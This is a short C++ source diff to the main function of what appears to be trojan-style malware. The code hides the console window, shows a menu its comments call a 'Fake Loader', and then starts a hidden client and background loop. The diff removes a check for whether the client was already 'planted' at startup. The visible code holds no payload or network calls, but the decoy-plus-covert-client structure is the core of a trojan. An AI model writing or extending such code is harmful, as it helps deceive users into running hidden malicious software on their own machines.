@@ -10,21 +10,21 @@ int main() {
 	/* Hide Console */
 	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
-	/* Create Client Thread */
-	std::thread client(start_client);
-
-	/* Check If Client Already Planted */
-	if (!check_for_startup()) {
+	/* Show Fake Loader */
+	{
 		/* Start Menu */
 		menu_init();
 
 		/* Run Menu Loop */
 		menu_loop();
 	}
-	
+
+	/* Run Client */
+	client::start_client();
+
 	/* Run Background Loop */
-	if (run_background)
-		background_loop();
+	if (client::run_background)
+		client::background_loop();
 
 	return 0;
 }
